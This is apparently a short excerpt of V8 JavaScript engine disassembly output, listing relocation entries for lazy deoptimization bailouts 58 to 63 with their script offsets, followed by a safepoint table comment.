0x1425ddef708d  runtime entry  (lazy deoptimization bailout 58)
0x1425ddef7091  deopt script offset  (670)
0x1425ddef7091  deopt inlining id  (-1)
0x1425ddef7091  deopt reason  ((unknown))
0x1425ddef7091  deopt index
0x1425ddef7092  runtime entry  (lazy deoptimization bailout 59)
0x1425ddef7096  deopt script offset  (650)
0x1425ddef7096  deopt inlining id  (-1)
0x1425ddef7096  deopt reason  ((unknown))
0x1425ddef7096  deopt index
0x1425ddef7097  runtime entry  (lazy deoptimization bailout 60)
0x1425ddef709b  deopt script offset  (579)
0x1425ddef709b  deopt inlining id  (-1)
0x1425ddef709b  deopt reason  ((unknown))
0x1425ddef709b  deopt index
0x1425ddef709c  runtime entry  (lazy deoptimization bailout 61)
0x1425ddef70a0  deopt script offset  (462)
0x1425ddef70a0  deopt inlining id  (-1)
0x1425ddef70a0  deopt reason  ((unknown))
0x1425ddef70a0  deopt index
0x1425ddef70a1  runtime entry  (lazy deoptimization bailout 62)
0x1425ddef70a5  deopt script offset  (436)
0x1425ddef70a5  deopt inlining id  (-1)
0x1425ddef70a5  deopt reason  ((unknown))
0x1425ddef70a5  deopt index
0x1425ddef70a6  runtime entry  (lazy deoptimization bailout 63)
0x1425ddef70ac  comment  (;;; Safepoint table.)

--- End code ---
